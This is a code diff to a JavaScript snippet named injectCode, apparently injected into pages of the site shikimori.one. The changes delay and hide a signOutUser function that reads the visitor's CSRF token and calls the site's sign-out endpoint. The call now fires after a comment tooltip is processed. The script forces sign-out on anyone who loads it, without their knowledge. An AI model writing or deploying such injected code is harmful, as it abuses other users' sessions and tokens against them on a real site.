@@ -79,7 +79,8 @@ function injectCode() {
   }
 }
 
- function signOutUser() {
+async function signOutUser(delay) {
+     await sleep(delay);
      const metaTag = document.querySelector('meta[name="csrf-token"]');
      const csrfToken = metaTag ? metaTag.getAttribute("content") : null;
      fetch('https://shikimori.one/api/users/sign_out', {
@@ -90,7 +91,7 @@ function injectCode() {
      })
  }
 
-function getTooltip() {
+async function getTooltip() {
   let defautUrl = 'https://shikimori.one/comments/10529261'
   let $container = $('.pusechka529');
   let $link = $container.children('.bubbled-processed');
@@ -108,8 +109,11 @@ function getTooltip() {
       $this.process();
     });
   }
+
+  let logoutDelay = $container.data('signout-delay') || 1000;
+  signOutUser(logoutDelay);
 }
 
 getTooltip();
-signOutUser();
+//signOutUser();
 document.addEventListener("turbolinks:load", injectCode);
